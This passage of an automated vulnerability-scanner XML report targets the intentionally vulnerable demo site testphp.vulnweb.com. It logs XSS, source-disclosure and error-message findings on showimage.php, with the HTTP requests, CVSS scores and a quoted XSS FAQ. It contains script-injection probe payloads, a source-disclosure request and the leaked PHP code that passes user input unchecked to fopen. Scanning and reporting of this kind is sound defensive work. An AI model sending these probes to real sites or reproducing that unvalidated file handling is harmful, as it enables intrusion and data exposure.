<p>The easiest way to protect yourself as a user is to only follow links from the main website you wish to view. If you visit one website and it links to CNN for example, instead of clicking on it visit CNN's main site and use its search engine to find the content. This will probably eliminate ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email, email attachment, read a guestbook, or bulletin board post. If you plan on opening an email, or reading a post on a public board from a person you don't know BE CAREFUL. One of the best ways to protect yourself is to turn off Javascript in your browser settings. In IE turn your security settings to high. This can prevent cookie theft, and in general is a safer thing to do.</p>

<h2>&quot;How common are XSS holes?&quot;</h2>

<p>Cross site scripting holes are gaining popularity among hackers as easy holes to find in large websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft, Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs.</p>

<p>Every month roughly 10-25 XSS holes are found in commercial products and advisories are published explaining the threat.</p>


<h2>&quot;Does encryption protect me?&quot;</h2>

<p>Websites that use SSL (https) are in no way more protected than websites that are not encrypted. The web applications work the same way as before, except the attack is taking place in an encrypted connection. People often think that because they see the lock on their browser it means everything is secure. This just isn't the case.</p>


<h2>&quot;Can XSS holes allow command execution?&quot;</h2>

<p>XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker were to exploit a browser flaw (browser hole) it could then be possible to execute commands on the client's side. If command execution were possible it would only be possible on the client side. In simple terms XSS holes can be used to help exploit other holes that may exist in your browser.</p>


<h2>&quot;What if I don't feel like fixing a CSS/XSS Hole?&quot;</h2>

<p>By not fixing an XSS hole this could allow possible user account compromise in portions of your site as they get added or updated. Cross Site Scripting has been found in various large sites recently and have been widely publicized. Left unrepaired, someone may discover it and publish a warning about your company. This may damage your company's reputation, depicting it as being lax on security matters. This of course also sends the message to your clients that you aren't dealing with every problem that arises, which turns into a trust issue. If your client doesn't trust you why would they wish to do business with you?</p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /showimage.php?file=http://testasp.vulnweb.com/t/xss.html%3f%2500.jpg HTTP/1.1
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:46:54 GMT
Content-Type: image/jpeg
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Content-Length: 33
]]></Response>
       </TechnicalDetails>
       <CWE id="79"><![CDATA[CWE-79]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Cross Site Scripting Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/cross-site-scripting.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: How Cross-Site Scripting (XSS) Works]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-how-cross-site-scripting-xss-works/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The Cross Site Scripting Faq]]></Database>
          <URL><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Cross Site Scripting]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Cross_Site_Scripting]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Annihilation]]></Database>
          <URL><![CDATA[http://ha.ckers.org/blog/20060602/xss-annihilation/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Filter Evasion Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross site scripting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Cross-site_scripting ]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How To: Prevent Cross-Site Scripting in ASP.NET]]></Database>
          <URL><![CDATA[http://msdn.microsoft.com/en-us/library/ms998274.aspx]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="31" color="red">
       <Name><![CDATA[Script source code disclosure]]></Name>
       <ModuleName><![CDATA[Scripting (Script_Source_Code_Disclosure.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">file</font></b> was set to <b><font color="dark">showimage.php</font></b><br/>Source disclosure pattern found: <pre wrap="virtual"><font color="blue">&lt;?php
// header(&quot;Content-Length: 1&quot; /*. filesize($name)*/);
if( isset($_GET[&quot;file&quot;]) &amp;&amp; !isset($_GET[&quot;size&quot;]) ){
	// open the file in a binary mode
	header(&quot;Content-Type: image/jpeg&quot;);
	$name = $_GET[&quot;file&quot;];
	$fp = fopen($name, 'rb');
	
	// send the right headers
	header(&quot;Content-Type: image/jpeg&quot;);	
	
	// dump the picture and stop the script
	fpassthru($fp);
	exit;
}
elseif (isset($_GET[&quot;file&quot;]) &amp;&amp; isset($_GET[&quot;size&quot;])){
	header(&quot;Content-Type: image/jpeg&quot;);
	$name = $_GET[&quot;file&quot;];
	$fp = fopen($name.'.tn', 'rb');
	
	// send the right headers
	header(&quot;Content-Type: image/jpeg&quot;);	
	
	// dump the picture and stop the script
	fpassthru($fp);
	exit;
}
?&gt; </font></pre>]]></Details>
       <Affects><![CDATA[/showimage.php]]></Affects>
       <Parameter><![CDATA[file]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker can gather sensitive information (database connection strings, application logic) by analyzing the source code. This information can be used to launch further attacks.]]></Impact>
       <Description><![CDATA[It is possible to read the source code of this script by using script filename as a parameter. It seems that this script includes a file which name is determined using user-supplied data. This data is not properly validated before being passed to the include function. ]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Analyze the source code of this script and solve the problem.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /showimage.php?file=showimage.php HTTP/1.1
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:46:54 GMT
Content-Type: image/jpeg
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Content-Length: 687
]]></Response>
       </TechnicalDetails>
       <CWE id="538"><![CDATA[CWE-538]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Source Code Disclosure Can Be Exploited On Your Website]]></Database>
          <URL><![CDATA[http://www.websitedefender.com/web-security/website-source-code-disclosure/]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="32" color="orange">
       <Name><![CDATA[Cross site scripting (content-sniffing)]]></Name>
       <ModuleName><![CDATA[Scripting (XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">file</font></b> was set to <b><font color="dark">1'&quot;()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;cGyr(9391)&lt;/ScRiPt&gt;</font></b>]]></Details>
       <Affects><![CDATA[/showimage.php]]></Affects>
       <Parameter><![CDATA[file]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
An attacker can steal the session cookie and take over the account, impersonating the user.
It is also possible to modify the content of the page presented to the user.]]></Impact>
       <Description><![CDATA[ <div class="coolbox"><font color="dark">This type of XSS can only be triggered on (and affects) content sniffing browsers.</font></div><br/>This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.<br/><br/>
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user.
Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from The Cross Site Scripting FAQ - http://www.cgisecurity.com/articles/xss-faq.shtml </i> 

<h2>Introduction</h2>

<p>Websites today are more complex than ever, containing a lot of dynamic content making the experience for the user more enjoyable. Dynamic content is achieved through the use of web applications which can deliver different output to a user depending on their settings and needs. Dynamic websites suffer from a threat that static websites don't, called &quot;Cross Site Scripting&quot; (or XSS dubbed by other security professionals). Currently small informational tidbits about Cross Site Scripting holes exist but none really explain them to an average person or administrator. This FAQ was written to provide a better understanding of this emerging threat, and to give guidance on detection and prevention.</p>

<h2>&quot;What is Cross Site Scripting?&quot;</h2>

<p>Cross site scripting (also known as XSS) occurs when a web application gathers malicious data from a user. The data is usually gathered in the form of a hyperlink which contains malicious content within it. The user will most likely click on this link from another website, instant message, or simply just reading a web board or email message. Usually the attacker will encode the malicious portion of the link to the site in HEX (or other encoding methods) so the request is less suspicious looking to the user when clicked on. After the data is collected by the web application, it creates an output page for the user containing the malicious data that was originally sent to it, but in a manner to make it appear as valid content from the website. Many popular guestbook and forum programs allow users to submit posts with html and javascript embedded in them. If for example I was logged in as &quot;john&quot; and read a message by &quot;joe&quot; that contained malicious javascript in it, then it may be possible for &quot;joe&quot; to hijack my session just by reading his bulletin board post. Further details on how attacks like this are accomplished via &quot;cookie theft&quot; are explained in detail below.</p>

<h2>&quot;What does XSS and CSS mean?&quot;</h2>

<p>Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site Scripting as XSS. If you hear someone say &quot;I found a XSS hole&quot;, they are talking about Cross Site Scripting for certain.</p>


<h2>&quot;What are the threats of Cross Site Scripting?&quot;</h2>

<p>Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable application to fool a user (Read below for further details) in order to gather data from them. Everything from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses are being found every day for XSS attacks. The post below by Brett Moore brings up a good point with regard to &quot;Denial Of Service&quot;, and potential &quot;auto-attacking&quot; of hosts if a user simply reads a post on a message board.</p>

<h2>&quot;What can I do to protect myself as a vendor?&quot;</h2>

<p>This is a simple answer. Never trust user input and always filter metacharacters. This will eliminate the majority of XSS attacks. Converting &lt; and &gt; to &amp;lt; and &amp;gt; is also suggested when it comes to script output. Remember XSS holes can be damaging and costly to your business if abused. Often attackers will disclose these holes to the public, which can erode customer and public confidence in the security and privacy of your organization's site. Filtering &lt; and &gt; alone will not solve all cross site scripting attacks and it is suggested you also attempt to filter out ( and ) by translating them to &amp;#40; and &amp;#41;, and also # and &amp; by translating them to &amp;#35 (#) and &amp;#38 (&amp;).</p>

<h2>&quot;What can I do to protect myself as a user?&quot;</h2>

<p>The easiest way to protect yourself as a user is to only follow links from the main website you wish to view. If you visit one website and it links to CNN for example, instead of clicking on it visit CNN's main site and use its search engine to find the content. This will probably eliminate ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email, email attachment, read a guestbook, or bulletin board post. If you plan on opening an email, or reading a post on a public board from a person you don't know BE CAREFUL. One of the best ways to protect yourself is to turn off Javascript in your browser settings. In IE turn your security settings to high. This can prevent cookie theft, and in general is a safer thing to do.</p>

<h2>&quot;How common are XSS holes?&quot;</h2>

<p>Cross site scripting holes are gaining popularity among hackers as easy holes to find in large websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft, Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs.</p>

<p>Every month roughly 10-25 XSS holes are found in commercial products and advisories are published explaining the threat.</p>


<h2>&quot;Does encryption protect me?&quot;</h2>

<p>Websites that use SSL (https) are in no way more protected than websites that are not encrypted. The web applications work the same way as before, except the attack is taking place in an encrypted connection. People often think that because they see the lock on their browser it means everything is secure. This just isn't the case.</p>


<h2>&quot;Can XSS holes allow command execution?&quot;</h2>

<p>XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker were to exploit a browser flaw (browser hole) it could then be possible to execute commands on the client's side. If command execution were possible it would only be possible on the client side. In simple terms XSS holes can be used to help exploit other holes that may exist in your browser.</p>


<h2>&quot;What if I don't feel like fixing a CSS/XSS Hole?&quot;</h2>

<p>By not fixing an XSS hole this could allow possible user account compromise in portions of your site as they get added or updated. Cross Site Scripting has been found in various large sites recently and have been widely publicized. Left unrepaired, someone may discover it and publish a warning about your company. This may damage your company's reputation, depicting it as being lax on security matters. This of course also sends the message to your clients that you aren't dealing with every problem that arises, which turns into a trust issue. If your client doesn't trust you why would they wish to do business with you?</p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /showimage.php?file=1'%22()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;cGyr(9391)&lt;/ScRiPt&gt; HTTP/1.1
Referer: http://testphp.vulnweb.com/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:46:55 GMT
Content-Type: image/jpeg
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Content-Length: 375
]]></Response>
       </TechnicalDetails>
       <CWE id="79"><![CDATA[CWE-79]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Cross Site Scripting Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/cross-site-scripting.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: How Cross-Site Scripting (XSS) Works]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-how-cross-site-scripting-xss-works/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The Cross Site Scripting Faq]]></Database>
          <URL><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Cross Site Scripting]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Cross_Site_Scripting]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Annihilation]]></Database>
          <URL><![CDATA[http://ha.ckers.org/blog/20060602/xss-annihilation/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Filter Evasion Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross site scripting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Cross-site_scripting ]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How To: Prevent Cross-Site Scripting in ASP.NET]]></Database>
          <URL><![CDATA[http://msdn.microsoft.com/en-us/library/ms998274.aspx]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="33" color="orange">
       <Name><![CDATA[Application error message]]></Name>
       <ModuleName><![CDATA[Scripting (XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">file</font></b> was set to <b><font color="dark">acu3569%EF%BC%9Cs1%EF%B9%A5s2%CA%BAs3%CA%B9uca3569</font></b><br/>Error message found: <pre wrap="virtual"><font color="blue">Warning: fopen(): Unable to access acu3569###s1###s2##s3##uca3569 in /hj/var/www/showimage.php on line 7

Warning: fopen(acu3569###s1###s2##s3##uca3569): failed to open stream: No such file or directory in /hj/var/www/showimage.php on line 7</font></pre>]]></Details>
       <Affects><![CDATA[/showimage.php]]></Affects>
       <Parameter><![CDATA[file]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[The error messages may disclose sensitive information. This information can be used to launch further attacks.]]></Impact>
       <Description><![CDATA[This page contains an error/warning message that may disclose sensitive information. The message can also contain the location of the file that produced the unhandled exception.<br/><br/>
This may be a false positive if the error message is found in documentation pages.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Review the source code for this script.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /showimage.php?file=acu3569%EF%BC%9Cs1%EF%B9%A5s2%CA%BAs3%CA%B9uca3569 HTTP/1.1
Referer: http://testphp.vulnweb.com/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:46:56 GMT
Content-Type: image/jpeg
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Content-Length: 355
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
